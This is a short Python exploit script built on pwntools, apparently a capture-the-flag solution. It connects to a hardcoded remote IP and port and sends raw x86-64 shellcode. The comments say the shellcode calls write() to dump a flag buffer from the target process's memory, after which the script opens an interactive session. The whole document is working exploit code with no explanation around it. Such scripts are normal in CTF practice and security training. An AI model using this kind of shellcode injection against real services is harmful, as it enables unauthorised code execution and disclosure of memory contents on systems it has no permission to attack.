from pwn import *

REMOTE_IP = "147.78.1.47"
REMOTE_PORT = 40183

p = remote(REMOTE_IP, REMOTE_PORT)

# mov rdi, 1
# mov rsi, [rbp-0x30] ; flag_mem
# mov rdx, 0x48
# mov rax, 1
# syscall ; write(stdout, flag_mem, 0x48)
shellcode = b"\xbf\x01\x00\00\x00\x48\x8b\x75\xd0\xba\x48\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05"

p.sendline(shellcode)

p.interactive()
